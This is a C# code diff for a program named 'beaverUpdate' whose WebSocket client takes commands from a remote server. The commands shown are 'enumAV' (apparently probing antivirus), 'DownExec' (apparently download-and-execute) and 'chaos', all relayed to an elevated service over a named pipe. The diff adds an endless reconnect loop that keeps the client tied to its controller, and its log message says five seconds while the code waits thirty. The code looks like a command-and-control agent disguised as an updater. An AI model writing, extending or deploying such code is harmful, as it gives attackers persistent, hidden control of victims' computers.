@@ -21,89 +21,102 @@ namespace beaverUpdate
 
         public static async Task ListenToWebSocketAsync(string uri)
         {
-            using (ClientWebSocket webSocket = new ClientWebSocket())
+            while (true)
             {
-                try
+                using (ClientWebSocket webSocket = new ClientWebSocket())
                 {
-                    // Connect to the WebSocket server
-                    await webSocket.ConnectAsync(new Uri(uri), CancellationToken.None);
-
-                    byte[] buffer = new byte[1024 * 4];
-                    var receiveBuffer = new ArraySegment<byte>(buffer);
-                    var sendCancellationToken = sendCancellationTokenSource.Token;
-
-                    while (webSocket.State == WebSocketState.Open)
+                    try
                     {
-                        // Check if there is a message to send
-                        string messageToSend;
-                        if (messageQueue.TryDequeue(out messageToSend))
+                        // Connect to the WebSocket server
+                        await webSocket.ConnectAsync(new Uri(uri), CancellationToken.None);
+
+                        byte[] buffer = new byte[1024 * 4];
+                        var receiveBuffer = new ArraySegment<byte>(buffer);
+                        var sendCancellationToken = sendCancellationTokenSource.Token;
+
+                        while (webSocket.State == WebSocketState.Open)
                         {
-                            byte[] messageBytes = Encoding.UTF8.GetBytes(messageToSend);
-                            var sendBuffer = new ArraySegment<byte>(messageBytes);
-
-                            await webSocket.SendAsync(sendBuffer, WebSocketMessageType.Text, true, CancellationToken.None);
-                            Console.WriteLine($"Sent: {messageToSend}");
-                        }
-
-                        // Receive the message from the server
-                        WebSocketReceiveResult result;
-
-                        using (var ms = new System.IO.MemoryStream())
-                        {
-                            do
+                            // Check if there is a message to send
+                            string messageToSend;
+                            if (messageQueue.TryDequeue(out messageToSend))
                             {
-                                result = await webSocket.ReceiveAsync(receiveBuffer, sendCancellationToken);
-                                ms.Write(receiveBuffer.Array, receiveBuffer.Offset, result.Count);
-                            } while (!result.EndOfMessage);
+                                byte[] messageBytes = Encoding.UTF8.GetBytes(messageToSend);
+                                var sendBuffer = new ArraySegment<byte>(messageBytes);
 
-                            // Reset the buffer and get the received message as a string
-                            ms.Seek(0, System.IO.SeekOrigin.Begin);
-                            using (var reader = new System.IO.StreamReader(ms))
+                                await webSocket.SendAsync(sendBuffer, WebSocketMessageType.Text, true, CancellationToken.None);
+                                Console.WriteLine($"Sent: {messageToSend}");
+                            }
+
+                            // Receive the message from the server
+                            WebSocketReceiveResult result;
+
+                            using (var ms = new System.IO.MemoryStream())
                             {
-                                string receivedText = await reader.ReadToEndAsync();
+                                do
+                                {
+                                    result = await webSocket.ReceiveAsync(receiveBuffer, sendCancellationToken);
 
-                                // Handle different types of messages
-                                if (receivedText.Contains("syncregister"))
+                                    if (webSocket.State != WebSocketState.Open)
+                                    {
+                                        throw new Exception("WebSocket connection died.");
+                                    }
+
+                                    ms.Write(receiveBuffer.Array, receiveBuffer.Offset, result.Count);
+                                } while (!result.EndOfMessage);
+
+                                // Reset the buffer and get the received message as a string
+                                ms.Seek(0, System.IO.SeekOrigin.Begin);
+                                using (var reader = new System.IO.StreamReader(ms))
                                 {
-                                    Console.WriteLine($"Received: {receivedText}");
-                                    // Execute async task for command1
-                                    await Task.Run(() => SyncRegister());
-                                }
-                                else if (receivedText.Contains("syncunregister"))
-                                {
-                                    Console.WriteLine($"Received: {receivedText}");
-                                    // Execute async task for command2
-                                    await Task.Run(() => SyncUnregister());
-                                } // ALL TASKS BELOW ARE RUN BY BEAVER ELEVATE SERVICE THROUGH NAMED PIPE
-                                else if (receivedText.Contains("enumAV"))
-                                {
-                                    Console.WriteLine($"Received: {receivedText}");
-                                    // Execute async task for command3
-                                    await Task.Run(() => SendRequest("enumAV"));
-                                }
-                                else if (receivedText.Contains("DownExec")) {
-                                    Console.WriteLine($"Received: {receivedText}");
-                                    await Task.Run(() => SendRequest(receivedText));
-                                }
-                                else if (receivedText.Contains("chaos"))
-                                {
-                                    Console.WriteLine($"Received: {receivedText}");
-                                    await Task.Run(() => SendRequest(receivedText));
-                                }
-                                else
-                                {
-                                    Console.WriteLine($"Unknown command received: {receivedText}");
+                                    string receivedText = await reader.ReadToEndAsync();
+
+                                    // Handle different types of messages
+                                    if (receivedText.Contains("syncregister"))
+                                    {
+                                        Console.WriteLine($"Received: {receivedText}");
+                                        // Execute async task for command1
+                                        await Task.Run(() => SyncRegister());
+                                    }
+                                    else if (receivedText.Contains("syncunregister"))
+                                    {
+                                        Console.WriteLine($"Received: {receivedText}");
+                                        // Execute async task for command2
+                                        await Task.Run(() => SyncUnregister());
+                                    } // ALL TASKS BELOW ARE RUN BY BEAVER ELEVATE SERVICE THROUGH NAMED PIPE
+                                    else if (receivedText.Contains("enumAV"))
+                                    {
+                                        Console.WriteLine($"Received: {receivedText}");
+                                        // Execute async task for command3
+                                        await Task.Run(() => SendRequest("enumAV"));
+                                    }
+                                    else if (receivedText.Contains("DownExec"))
+                                    {
+                                        Console.WriteLine($"Received: {receivedText}");
+                                        await Task.Run(() => SendRequest(receivedText));
+                                    }
+                                    else if (receivedText.Contains("chaos"))
+                                    {
+                                        Console.WriteLine($"Received: {receivedText}");
+                                        await Task.Run(() => SendRequest(receivedText));
+                                    }
+                                    else
+                                    {
+                                        Console.WriteLine($"Unknown command received: {receivedText}");
+                                    }
                                 }
                             }
-                        }
 
-                        // Wait before checking for the next message to send
-                        await Task.Delay(50, sendCancellationToken);
+                            // Wait before checking for the next message to send
+                            await Task.Delay(50, sendCancellationToken);
+                        }
                     }
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"An error occurred: {ex.Message}");
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"An error occurred: {ex.Message}. Reconnecting in 5 seconds...");
+
+                        // Wait for a specified time before attempting to reconnect
+                        await Task.Delay(30000);
+                    }
                 }
             }
         }
